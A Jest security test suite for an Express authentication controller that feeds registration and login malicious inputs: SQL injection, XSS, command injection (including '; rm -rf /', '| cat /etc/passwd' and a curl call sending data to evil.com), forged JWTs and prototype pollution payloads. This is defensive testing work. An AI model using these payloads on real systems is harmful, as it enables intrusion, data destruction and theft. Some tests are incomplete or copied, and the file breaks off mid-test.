// /backend/src/controllers/__tests__/authController.security.test.ts
import jwt from 'jsonwebtoken';
import { authController } from '../../controllers/authController';
import { userModel } from '../../models/userModel';
import { 
  createMockRequest, 
  createMockResponse, 
  createMockNext,
  mockUser 
} from '../__helpers__/auth.helper';
import { ApiError } from '../../utils/ApiError';

/**
 * 🔒 AUTH CONTROLLER SECURITY TEST SUITE
 * =======================================
 * * SECURITY TESTING STRATEGY:
 * * 1. INJECTION ATTACKS: SQL injection, NoSQL injection, Command injection
 * 2. AUTHENTICATION BYPASSES: Token manipulation, Session fixation, Privilege escalation
 * 3. INPUT VALIDATION: XSS, CSRF, Path traversal, Buffer overflow attempts
 * 4. CRYPTOGRAPHIC VULNERABILITIES: Weak hashing, Token prediction, Timing attacks
 * 5. RATE LIMITING & BRUTE FORCE: Account enumeration, Password spraying, Token brute force
 * 6. DATA EXPOSURE: Information disclosure, Error message leakage, Debug info exposure
 * 7. BUSINESS LOGIC FLAWS: Race conditions, State manipulation, Workflow bypasses
 * 8. PROTOCOL ATTACKS: JWT vulnerabilities, Header manipulation, Cookie security
 * * SECURITY SCOPE:
 * - OWASP Top 10 vulnerabilities
 * - Authentication-specific attack vectors
 * - Authorization bypass attempts
 * - Cryptographic security measures
 * - Input sanitization and validation
 * - Error handling security
 * - Session management security
 */

// ==================== SECURITY TEST SETUP ====================

// Mock all external dependencies
jest.mock('../../models/userModel', () => ({
  userModel: {
    create: jest.fn(),
    findByEmail: jest.fn(),
    findById: jest.fn(),
    validatePassword: jest.fn()
  }
}));

jest.mock('jsonwebtoken', () => ({
  sign: jest.fn(),
  verify: jest.fn(),
  decode: jest.fn()
}));

jest.mock('../../config', () => ({
  config: {
    jwtSecret: 'test-security-secret-key',
    jwtExpiresIn: '1d'
  }
}));

// ADDED: Mock the entire 'pg' module to prevent actual database connections
jest.mock('pg', () => {
  const mClient = {
    connect: jest.fn(() => Promise.resolve()), // Mock connect to resolve immediately
    query: jest.fn(() => Promise.resolve({ rows: [] })), // Mock query to return an empty array of rows
    end: jest.fn(() => Promise.resolve()), // Mock end to resolve immediately
    on: jest.fn(), // Mock 'on' for event listeners (e.g., 'error')
  };
  return {
    // Mock the Pool class if your application uses connection pools
    Pool: jest.fn(() => ({
      connect: jest.fn(() => Promise.resolve(mClient)), // Pool's connect method returns a mocked client
      query: jest.fn(() => Promise.resolve({ rows: [] })), // Pool's query method directly
      end: jest.fn(() => Promise.resolve()), // Pool's end method
    })),
    // Mock the Client class if your application uses direct client instances
    Client: jest.fn(() => mClient),
  };
});


// Security test helpers
const createSecurityTestApp = () => {
  const express = require('express');
  const app = express();
  
  app.use(express.json({ limit: '10mb' }));
  app.use(express.urlencoded({ extended: true }));
  
  // Add security headers middleware
  app.use((req: any, res: any, next: any) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
  });
  
  // Auth routes
  // Ensure that authRoutes doesn't implicitly start a real DB connection
  // that bypasses the 'pg' mock. The 'pg' mock above should handle this.
  app.use('/api/auth', require('../../routes/authRoutes').authRoutes);
  
  return app;
};

// Malicious payload generators
const generateSQLInjectionPayloads = () => [
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  "' UNION SELECT * FROM users --",
  "admin'--",
  "'; INSERT INTO users VALUES ('hacker', 'password'); --",
  "' OR 1=1#",
  "'; EXEC xp_cmdshell('dir'); --",
  "' AND (SELECT COUNT(*) FROM users) > 0 --"
];

const generateXSSPayloads = () => [
  "<script>alert('xss')</script>",
  "javascript:alert('xss')",
  "<img src=x onerror=alert('xss')>",
  "<svg onload=alert('xss')>",
  "&#60;script&#62;alert('xss')&#60;/script&#62;",
  "<iframe src='javascript:alert(\"xss\")'></iframe>",
  "<body onload=alert('xss')>",
  "';alert('xss');//"
];

const generateCommandInjectionPayloads = () => [
  "; ls -la",
  "| cat /etc/passwd",
  "& ping -c 1 127.0.0.1",
  "`whoami`",
  "$(cat /etc/hosts)",
  "; rm -rf /",
  "| nc -l 1234",
  "; curl http://evil.com/steal?data="
];

const generateBufferOverflowPayloads = () => [
  'A'.repeat(1000),
  'A'.repeat(10000),
  'A'.repeat(100000),
  '\x00'.repeat(1000),
  '%s'.repeat(1000),
  '\n'.repeat(10000)
];

const generateJWTAttackPayloads = () => [
  // Algorithm confusion
  'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6IjEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSJ9.',
  // Modified algorithm
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFkbWluIiwiZW1haWwiOiJhZG1pbkBleGFtcGxlLmNvbSJ9.invalid',
  // Blank signature
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSJ9.',
  // RSA key confusion
  'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSJ9.invalid'
];

// ==================== MAIN SECURITY TEST SUITE ====================

describe('AuthController Security Tests', () => {
  const mockUserModel = userModel as jest.Mocked<typeof userModel>;
  const mockJwt = jwt as jest.Mocked<typeof jwt>;
  let app: any;

  beforeAll(() => {
    app = createSecurityTestApp();
  });

  beforeEach(() => {
    jest.clearAllMocks();
    
    // Suppress console output for cleaner test results
    // Explicitly define empty functions for mockImplementation
    jest.spyOn(console, 'log').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
    jest.spyOn(console, 'error').mockImplementation(() => {});
    
    // Set up default mocks
    mockJwt.sign.mockReturnValue('mock-jwt-token' as any);
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  afterAll(() => {
    jest.resetModules(); 
  });
  
  // ==================== INJECTION ATTACK TESTS ====================
  describe('SQL Injection Protection', () => {
    it('should prevent SQL injection in email field during registration', async () => {
      const sqlPayloads = generateSQLInjectionPayloads();

      for (const payload of sqlPayloads) {
        mockUserModel.create.mockReset();
        
        const req = createMockRequest({
          body: {
            email: payload,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Should either reject with validation error or sanitize input
        if ((next as jest.Mock).mock.calls.length > 0) {
          const error = (next as jest.Mock).mock.calls[0][0];
          expect(error).toMatchObject({
            statusCode: 400,
            message: expect.stringMatching(/email|format|validation/i)
          });
        } else {
          // If accepted, ensure it was properly sanitized
          expect(mockUserModel.create).not.toHaveBeenCalledWith(
            expect.objectContaining({
              email: expect.stringContaining('DROP TABLE')
            })
          );
        }

        jest.clearAllMocks();
      }
    });

    it('should prevent SQL injection in email field during login', async () => {
      const sqlPayloads = generateSQLInjectionPayloads();

      for (const payload of sqlPayloads) {
        mockUserModel.findByEmail.mockReset(); 
        mockJwt.sign.mockReset(); // Also reset jwt.sign for each iteration

        // Mock findByEmail to always indicate user not found for these malicious payloads.
        // This is crucial: For a real database, these malformed "emails" would not exist,
        // and for a properly parameterized query, they wouldn't execute SQL.
        // The mock simulates the secure outcome: no user found.
        mockUserModel.findByEmail.mockResolvedValue(null); 
        
        const req = createMockRequest({
          body: {
            email: payload,
            password: 'ValidPass123!' 
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.login(req as any, res as any, next);

        // ASSERTIONS:

        // 1. Verify that findByEmail was called exactly once with the raw payload.
        // This confirms that the controller attempted to look up the "user" with the provided input.
        expect(mockUserModel.findByEmail).toHaveBeenCalledTimes(1);
        expect(mockUserModel.findByEmail).toHaveBeenCalledWith(payload);

        // The critical security aspect: The call to findByEmail should *not* lead to successful authentication.
        // This is verified by checking the error thrown to the 'next' middleware.

        // 2. Assert that an error was passed to next(), indicating failure
        expect(next).toHaveBeenCalledTimes(1);
        const error = (next as jest.Mock).mock.calls[0][0];

        // 3. Expect an unauthorized error (401) because the "user" wasn't found/authenticated.
        // This is the secure outcome: the malicious input did not lead to a successful login.
        expect(error).toMatchObject({
          statusCode: 401, 
          message: expect.stringMatching(/invalid credentials|authentication failed|user not found/i) 
        });

        // 4. Also ensure that no JWT was signed, confirming no successful login.
        expect(mockJwt.sign).not.toHaveBeenCalled();
        
        // 5. And no direct response was sent from the controller (because next() was called with an error).
        expect(res.status).not.toHaveBeenCalled();
        expect(res.json).not.toHaveBeenCalled();
      }
    });

    it('should handle SQL injection attempts in password field', async () => {
      const sqlPayloads = generateSQLInjectionPayloads();

      for (const payload of sqlPayloads) {
        const req = createMockRequest({
          body: {
            email: 'test@example.com',
            password: payload
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Password should be validated for length/strength, not SQL content
        const nextCalls = (next as jest.Mock).mock.calls;
        if (nextCalls.length > 0 && payload.length < 8) {
          const error = nextCalls[0][0];
          expect(error.message).toContain('at least 8 characters');
        }
      }
    });

    it('should invalidate tokens on suspicious activity', async () => {
      const req = createMockRequest({
        user: {
          id: mockUser.id,
          email: mockUser.email
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.me(req as any, res as any, next);

      // Should require valid authentication token
      expect(req.user).toBeDefined();
      expect((res.json as jest.Mock)).toHaveBeenCalledWith(
        expect.objectContaining({
          status: 'success',
          data: expect.objectContaining({
            user: expect.objectContaining({
              id: mockUser.id,
              email: mockUser.email
            })
          })
        })
      );
    });
  });

  // ==================== CRYPTOGRAPHIC SECURITY ====================

  describe('Cryptographic Security', () => {
    it('should use secure random values for token generation', async () => {
      const tokens = new Set();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        // Mock unique token for each iteration
        mockJwt.sign.mockReturnValueOnce(`secure-token-${i}-${Math.random()}` as any);
        
        const req = createMockRequest({
          body: {
            email: `test${i}@example.com`,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        mockUserModel.create.mockResolvedValue({
          ...mockUser,
          id: `user-${i}`,
          email: `test${i}@example.com`
        });

        await authController.register(req as any, res as any, next);

        if ((res.json as jest.Mock).mock.calls.length > 0) {
          const response = (res.json as jest.Mock).mock.calls[0][0];
          tokens.add(response.data.token);
        }

        jest.clearAllMocks();
      }

      // All tokens should be unique
      expect(tokens.size).toBe(iterations);
    });

    it('should prevent JWT key confusion attacks', async () => {
      // Ensure consistent algorithm usage
      mockUserModel.create.mockResolvedValue(mockUser);

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      // Verify JWT is signed with HMAC (not RSA)
      expect(mockJwt.sign).toHaveBeenCalledWith(
        expect.any(Object),
        'test-security-secret-key',
        { expiresIn: '1d' }
      );
    });

    it('should handle cryptographic errors securely', async () => {
      mockJwt.sign.mockImplementation(() => {
        throw new Error('Cryptographic operation failed');
      });

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      mockUserModel.create.mockResolvedValue(mockUser);

      await authController.register(req as any, res as any, next);

      // Should handle crypto errors gracefully
      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error).toBeInstanceOf(Error);
        // Should not expose crypto implementation details
        expect(error.message).not.toContain('key');
        expect(error.message).not.toContain('algorithm');
      }
    });
  });

  // ==================== AUTHORIZATION BYPASS TESTS ====================

  describe('Authorization Bypass', () => {
    it('should prevent privilege escalation through JWT manipulation', async () => {
      // Test that user cannot elevate privileges through token claims
      const maliciousPayload = {
        id: mockUser.id,
        email: mockUser.email,
        role: 'admin',
        isAdmin: true,
        permissions: ['*']
      };

      mockJwt.sign.mockReturnValue('malicious-token' as any);

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      mockUserModel.create.mockResolvedValue(mockUser);

      await authController.register(req as any, res as any, next);

      // Should only include basic user info in token
      expect(mockJwt.sign).toHaveBeenCalledWith(
        {
          id: mockUser.id,
          email: mockUser.email
        },
        expect.any(String),
        expect.any(Object)
      );
    });

    it('should prevent horizontal privilege escalation', async () => {
      const user1 = { ...mockUser, id: 'user-1', email: 'user1@example.com' };
      const user2 = { ...mockUser, id: 'user-2', email: 'user2@example.com' };

      // User 1 profile request with User 2's token
      const req = createMockRequest({
        user: user1 // Should match token claims
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.me(req as any, res as any, next);

      if ((res.json as jest.Mock).mock.calls.length > 0) {
        const response = (res.json as jest.Mock).mock.calls[0][0];
        // Should only return the authenticated user's data
        expect(response.data.user.id).toBe(user1.id);
        expect(response.data.user.email).toBe(user1.email);
      }
    });
  });

  // ==================== BUSINESS LOGIC SECURITY ====================

  describe('Business Logic Security', () => {
    it('should prevent race conditions in user registration', async () => {
      const emailAddress = 'race@example.com';
      const promises = [];

      // Simulate concurrent registration attempts
      for (let i = 0; i < 5; i++) {
        mockUserModel.create.mockImplementation(() => {
          if (i === 0) {
            return Promise.resolve({ ...mockUser, email: emailAddress });
          } else {
            return Promise.reject(ApiError.conflict('User already exists', 'EMAIL_IN_USE'));
          }
        });

        const req = createMockRequest({
          body: {
            email: emailAddress,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        promises.push(authController.register(req as any, res as any, next));
      }

      await Promise.allSettled(promises);

      // Should handle concurrent requests gracefully
      expect(mockUserModel.create).toHaveBeenCalled();
    });

    it('should prevent state manipulation attacks', async () => {
      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!',
          id: 'malicious-id',
          isVerified: true,
          role: 'admin'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      mockUserModel.create.mockResolvedValue(mockUser);

      await authController.register(req as any, res as any, next);

      // Should only pass allowed fields to user creation
      if (mockUserModel.create.mock.calls.length > 0) {
        const createArgs = mockUserModel.create.mock.calls[0][0];
        expect(createArgs).toEqual({
          email: 'test@example.com',
          password: 'ValidPass123!'
        });
        expect(createArgs).not.toHaveProperty('id');
        expect(createArgs).not.toHaveProperty('isVerified');
        expect(createArgs).not.toHaveProperty('role');
      }
    });
  });

  // ==================== DATA EXPOSURE TESTS ====================

  describe('Data Exposure Prevention', () => {
    it('should not expose password hashes in responses', async () => {
      const userWithHash = {
        ...mockUser,
        password_hash: '$2b$10$hashvalue123456789'
      };

      mockUserModel.create.mockResolvedValue(userWithHash);

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      if ((res.json as jest.Mock).mock.calls.length > 0) {
        const response = (res.json as jest.Mock).mock.calls[0][0];
        expect(response.data.user).not.toHaveProperty('password');
        expect(response.data.user).not.toHaveProperty('password_hash');
              expect(JSON.stringify(response)).not.toContain('$2b$');
            }
    });

    it('should prevent information disclosure through debug output', async () => {
      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      mockUserModel.create.mockResolvedValue(mockUser);

      await authController.register(req as any, res as any, next);

      if ((res.json as jest.Mock).mock.calls.length > 0) {
        const response = (res.json as jest.Mock).mock.calls[0][0];
        // Should not expose internal system information
        expect(JSON.stringify(response)).not.toContain('stack');
        expect(JSON.stringify(response)).not.toContain('trace');
        expect(JSON.stringify(response)).not.toContain('debug');
      }
    });
  });

  // ==================== NOSQL INJECTION TESTS ====================
      
  describe('NoSQL Injection Protection', () => {
    it('should prevent NoSQL injection in registration', async () => {
            const noSQLPayloads = [
              { $gt: '' },
              { $ne: null },
              { $regex: '.*' },
              { $where: 'this.password' },
              { $expr: { $gt: ['$password', ''] } }
            ];
      
            for (const payload of noSQLPayloads) {
              const req = createMockRequest({
                body: {
                  email: payload,
                  password: 'ValidPass123!'
                }
              });
              const res = createMockResponse();
              const next = createMockNext()
      }
    });
  });

  // ==================== AUTHENTICATION BYPASS TESTS ====================

  describe('JWT Security', () => {
    it('should prevent JWT algorithm confusion attacks', async () => {
      const maliciousTokens = generateJWTAttackPayloads();

      for (const token of maliciousTokens) {
        const req = createMockRequest({
          headers: {
            authorization: `Bearer ${token}`
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        // This would be tested with authentication middleware, 
        // but we can test the token generation security
        mockJwt.sign.mockReset();
        
        const registerReq = createMockRequest({
          body: {
            email: 'test@example.com',
            password: 'ValidPass123!'
          }
        });
        
        mockUserModel.create.mockResolvedValue(mockUser);
        
        await authController.register(registerReq as any, res as any, next);

        // Ensure JWT is signed with correct algorithm
        if (mockJwt.sign.mock.calls.length > 0) {
          const [payload, secret, options] = mockJwt.sign.mock.calls[0];
          expect(secret).toBe('test-security-secret-key');
          expect(options).toEqual({ expiresIn: '1d' });
        }
      }
    });

    it('should generate cryptographically secure tokens', async () => {
      const tokens: string[] = [];
      
      // Generate multiple tokens and check for patterns
      for (let i = 0; i < 10; i++) {
        mockJwt.sign.mockReturnValue(`token-${i}-${Math.random()}` as any);
        
        const req = createMockRequest({
          body: {
            email: `test${i}@example.com`,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        mockUserModel.create.mockResolvedValue({
          ...mockUser,
          id: `user-${i}`,
          email: `test${i}@example.com`
        });

        await authController.register(req as any, res as any, next);

        if ((res.json as jest.Mock).mock.calls.length > 0) {
          const response = (res.json as jest.Mock).mock.calls[0][0];
          tokens.push(response.data.token);
        }

        jest.clearAllMocks();
      }

      // Tokens should be unique
      const uniqueTokens = new Set(tokens);
      expect(uniqueTokens.size).toBe(tokens.length);
    });

    it('should not expose JWT secret in error messages', async () => {
      mockJwt.sign.mockImplementation(() => {
        throw new Error('JWT signing failed with secret: test-security-secret-key');
      });

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      mockUserModel.create.mockResolvedValue(mockUser);

      await authController.register(req as any, res as any, next);

      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        expect(error.message).not.toContain('test-security-secret-key');
      }
    });
  });

  describe('Password Security', () => {
    it('should enforce strong password requirements', async () => {
      const weakPasswords = [
        { value: 'password', expectedMessage: 'Password must be at least 8 characters long' }, // Common password (length >= 8)
        { value: '12345678', expectedMessage: 'Password must be at least 8 characters long' }, // Numeric only (length >= 8)
        { value: 'abcdefgh', expectedMessage: 'Password must be at least 8 characters long' }, // Lowercase only (length >= 8)
        { value: 'ABCDEFGH', expectedMessage: 'Password must be at least 8 characters long' }, // Uppercase only (length >= 8)
        { value: 'pass',     expectedMessage: 'Password must be at least 8 characters long' }, // Too short (length < 8)
        { value: '1234',     expectedMessage: 'Password must be at least 8 characters long' }, // Too short and numeric (length < 8)
        { value: '',         expectedMessage: 'Email and password are required' },            // Empty - will hit !password first
        { value: ' '.repeat(8), expectedMessage: 'Email and password are required' },           // Whitespace only - will fail !password if trimmed
        { value: 'admin',    expectedMessage: 'Password must be at least 8 characters long' }, // Common admin password (length < 8)
        { value: 'qwerty123', expectedMessage: 'Password must be at least 8 characters long' } // Common pattern (length >= 8)
      ];

      for (const { value: password, expectedMessage } of weakPasswords) {
        jest.clearAllMocks(); // Clear mocks for each iteration

        const req = createMockRequest({
          body: {
            email: 'test@example.com',
            password: password
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Always expect 'next' to be called with an error for these weak passwords
        expect(next).toHaveBeenCalledTimes(1);
        const error = (next as jest.Mock).mock.calls[0][0];

        // Assert that the received error's message matches the specific expected message
        expect(error).toEqual(
          expect.objectContaining({
            message: expectedMessage,
            statusCode: 400 // All these are bad requests
          })
        );

        // Ensure no user was created and no token was signed for any of these
        expect(mockUserModel.create).not.toHaveBeenCalled();
        expect(mockJwt.sign).not.toHaveBeenCalled();
      }
    });

    it('should prevent password enumeration through timing attacks', async () => {
      const timings: number[] = [];
      const iterations = 5;

      // Test with existing user (valid email)
      const mockUser = {
        id: 'user-123',
        email: 'test@example.com',
        password: 'hashedpassword123', // Keep if needed
        password_hash: 'hashedpassword123', // Add this required property
        created_at: new Date(),
        updated_at: new Date()
      };

      mockUserModel.findByEmail.mockResolvedValue(mockUser);
      mockUserModel.validatePassword.mockResolvedValue(false);

      for (let i = 0; i < iterations; i++) {
        const start = Date.now();
        
        const req = createMockRequest({
          body: {
            email: 'existing@example.com',
            password: 'WrongPassword123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.login(req as any, res as any, next);
        
        timings.push(Date.now() - start);
        jest.clearAllMocks();
      }

      // Test with non-existing user (invalid email)
      mockUserModel.findByEmail.mockResolvedValue(null);

      for (let i = 0; i < iterations; i++) {
        const start = Date.now();
        
        const req = createMockRequest({
          body: {
            email: 'nonexistent@example.com',
            password: 'WrongPassword123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.login(req as any, res as any, next);
        
        timings.push(Date.now() - start);
        jest.clearAllMocks();
      }

      // Calculate timing differences - should be reasonably consistent
      const avgTime = timings.reduce((a, b) => a + b, 0) / timings.length;
      const maxDeviation = Math.max(...timings.map(t => Math.abs(t - avgTime)));
      
      // Allow some variance but prevent significant timing differences
      expect(maxDeviation).toBeLessThan(avgTime * 3);
    });
  });

  // ==================== INPUT VALIDATION SECURITY ====================

  describe('Input Validation Security', () => {
    it('should prevent buffer overflow attempts', async () => {
      const overflowPayloads = generateBufferOverflowPayloads();

      for (const payload of overflowPayloads) {
        const req = createMockRequest({
          body: {
            email: `test@example.com`,
            password: payload
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        // Should handle large inputs gracefully
        await expect(
          authController.register(req as any, res as any, next)
        ).resolves.not.toThrow();

        jest.clearAllMocks();
      }
    });

    it('should validate input types and prevent type confusion', async () => {
      const invalidInputs = [
        { email: 123, password: 'ValidPass123!' },
        { email: [], password: 'ValidPass123!' },
        { email: {}, password: 'ValidPass123!' },
        { email: null, password: 'ValidPass123!' },
        { email: undefined, password: 'ValidPass123!' },
        { email: 'test@example.com', password: 123 },
        { email: 'test@example.com', password: [] },
        { email: 'test@example.com', password: {} },
        { email: 'test@example.com', password: null },
        { email: 'test@example.com', password: undefined }
      ];

      for (const input of invalidInputs) {
        const req = createMockRequest({ body: input });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Should handle type validation gracefully
        expect((next as jest.Mock).mock.calls.length).toBeGreaterThan(0);
        
        jest.clearAllMocks();
      }
    });

    it('should prevent prototype pollution attacks', async () => {
      const pollutionPayloads = [
        {
          email: 'test@example.com',
          password: 'ValidPass123!',
          '__proto__.isAdmin': true
        },
        {
          email: 'test@example.com',
          password: 'ValidPass123!',
          'constructor.prototype.isAdmin': true
        },
        {
          email: 'test@example.com',
          password: 'ValidPass123!',
          '__proto__': { isAdmin: true }
        }
      ];

      for (const payload of pollutionPayloads) {
        const req = createMockRequest({ body: payload });
        const res = createMockResponse();
        const next = createMockNext();

        mockUserModel.create.mockResolvedValue(mockUser);

        await authController.register(req as any, res as any, next);

        // Should not pollute Object prototype
        expect((Object.prototype as any).isAdmin).toBeUndefined();
        
        // Should only pass expected fields to userModel
        if (mockUserModel.create.mock.calls.length > 0) {
          const createCall = mockUserModel.create.mock.calls[0][0];
          expect(createCall).toEqual({
            email: 'test@example.com',
            password: 'ValidPass123!'
          });
        }

        jest.clearAllMocks();
      }
    });
  });

  // ==================== ERROR HANDLING SECURITY ====================

  describe('Error Handling Security', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Test database error exposure
      mockUserModel.create.mockRejectedValue(
        new Error('Database connection failed: postgresql://user:password@localhost:5432/db')
      );

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        // Should not expose database connection strings
        expect(error.message).not.toContain('postgresql://');
        expect(error.message).not.toContain(':password@');
      }
    });

    it('should not leak system information in stack traces', async () => {
      mockUserModel.create.mockRejectedValue(
        new Error('Internal server error with path /etc/passwd')
      );

      const req = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      if ((next as jest.Mock).mock.calls.length > 0) {
        const error = (next as jest.Mock).mock.calls[0][0];
        // Should not expose system paths
        expect(error.message).not.toContain('/etc/passwd');
        expect(error.message).not.toContain('C:\\');
      }
    });

    it('should use consistent error messages for security', async () => {
      const testCases = [
        {
          name: 'non-existent user',
          setup: () => mockUserModel.findByEmail.mockResolvedValue(null)
        },
        {
          name: 'invalid password',
          setup: () => {
            const mockUser = {
              id: 'user-123',
              email: 'test@example.com',
              password: 'hashedpassword123', // Keep if needed
              password_hash: 'hashedpassword123', // Add this required property
              created_at: new Date(),
              updated_at: new Date()
            };

            mockUserModel.findByEmail.mockResolvedValue(mockUser);
            mockUserModel.validatePassword.mockResolvedValue(false);
          }
        }
      ];

      const errorMessages: string[] = [];

      for (const testCase of testCases) {
        testCase.setup();

        const req = createMockRequest({
          body: {
            email: 'test@example.com',
            password: 'WrongPassword123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.login(req as any, res as any, next);

        if ((next as jest.Mock).mock.calls.length > 0) {
          const error = (next as jest.Mock).mock.calls[0][0];
          errorMessages.push(error.message);
        }

        jest.clearAllMocks();
      }

      // Both scenarios should return the same error message
      expect(errorMessages[0]).toBe(errorMessages[1]);
      expect(errorMessages[0]).toBe('Invalid credentials');
    });
  });

  // ==================== RATE LIMITING & BRUTE FORCE ====================

  describe('Brute Force Protection', () => {
    it('should handle rapid repeated login attempts', async () => {
      const mockUser = {
        id: 'user-123',
        email: 'test@example.com',
        password: 'hashedpassword123', // Keep if needed
        password_hash: 'hashedpassword123', // Add this required property
        created_at: new Date(),
        updated_at: new Date()
      };

      mockUserModel.findByEmail.mockResolvedValue(mockUser);
      mockUserModel.validatePassword.mockResolvedValue(false);

      const promises = [];
      const attemptCount = 10;

      // Simulate rapid repeated failed login attempts
      for (let i = 0; i < attemptCount; i++) {
        const req = createMockRequest({
          body: {
            email: 'test@example.com',
            password: `WrongPassword${i}!`
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        promises.push(authController.login(req as any, res as any, next));
      }

      // Should handle concurrent requests without crashing
      await expect(Promise.all(promises)).resolves.toBeDefined();

      // All attempts should fail with same error
      expect(mockUserModel.validatePassword).toHaveBeenCalledTimes(attemptCount);
    });

    it('should prevent account enumeration through registration', async () => {
      // First registration succeeds
      mockUserModel.create.mockResolvedValueOnce(mockUser);

      const req1 = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res1 = createMockResponse();
      const next1 = createMockNext();

      await authController.register(req1 as any, res1 as any, next1);

      // Second registration with same email should fail with generic error
      mockUserModel.create.mockRejectedValueOnce(
        ApiError.conflict('User with this email already exists', 'EMAIL_IN_USE')
      );

      const req2 = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const res2 = createMockResponse();
      const next2 = createMockNext();

      await authController.register(req2 as any, res2 as any, next2);

      if ((next2 as jest.Mock).mock.calls.length > 0) {
        const error = (next2 as jest.Mock).mock.calls[0][0];
        // Should indicate email is in use but not expose other details
        expect(error.code).toBe('EMAIL_IN_USE');
      }
    });
  });

  // ==================== SESSION MANAGEMENT SECURITY ====================

  describe('Session Security', () => {
    it('should prevent session fixation attacks', async () => {
      // Register user
      mockUserModel.create.mockResolvedValue(mockUser);

      const registerReq = createMockRequest({
        body: {
          email: 'test@example.com',
          password: 'ValidPass123!'
        }
      });
      const registerRes = createMockResponse();
      const registerNext = createMockNext();

      await authController.register(registerReq as any, registerRes as any, registerNext);

      if ((registerNext as jest.Mock).mock.calls.length > 0) {
        const error = (registerNext as jest.Mock).mock.calls[0][0];
        expect(error).toMatchObject({
          statusCode: 400,
          message: expect.stringMatching(/email|format|validation/i)
        });
      } else {
        // If accepted, ensure it was properly sanitized
        expect(mockUserModel.create).not.toHaveBeenCalledWith(
          expect.objectContaining({
            email: expect.stringContaining('DROP TABLE')
          })
        );
      }
    });    
  });

  describe('XSS Protection', () => {
    it('should prevent XSS in email field during registration', async () => {
      const xssPayloads = generateXSSPayloads();

      for (const payload of xssPayloads) {
        const req = createMockRequest({
          body: {
            email: `user${payload}@example.com`,
            password: 'ValidPass123!'
          }
        });
        const res = createMockResponse();
        const next = createMockNext();

        await authController.register(req as any, res as any, next);

        // Should reject invalid email format or sanitize
        if ((next as jest.Mock).mock.calls.length > 0) {
          const error = (next as jest.Mock).mock.calls[0][0];
          expect(error.message).toMatch(/email|format/i);
        }

        // Response should not contain unsanitized script tags
        if ((res.json as jest.Mock).mock.calls.length > 0) {
          const response = (res.json as jest.Mock).mock.calls[0][0];
          expect(JSON.stringify(response)).not.toContain('<script>');
          expect(JSON.stringify(response)).not.toContain('javascript:');
        }
      }
    });

    it('should prevent XSS in error messages', async () => {
      const xssEmail = '<script>alert("xss")</script>@example.com';
      
      const req = createMockRequest({
        body: {
          email: xssEmail,
          password: 'ValidPass123!'
        }
      });
      const res = createMockResponse();
      const next = createMockNext();

      await authController.register(req as any, res as any, next);

      // Error messages should not reflect unescaped user input
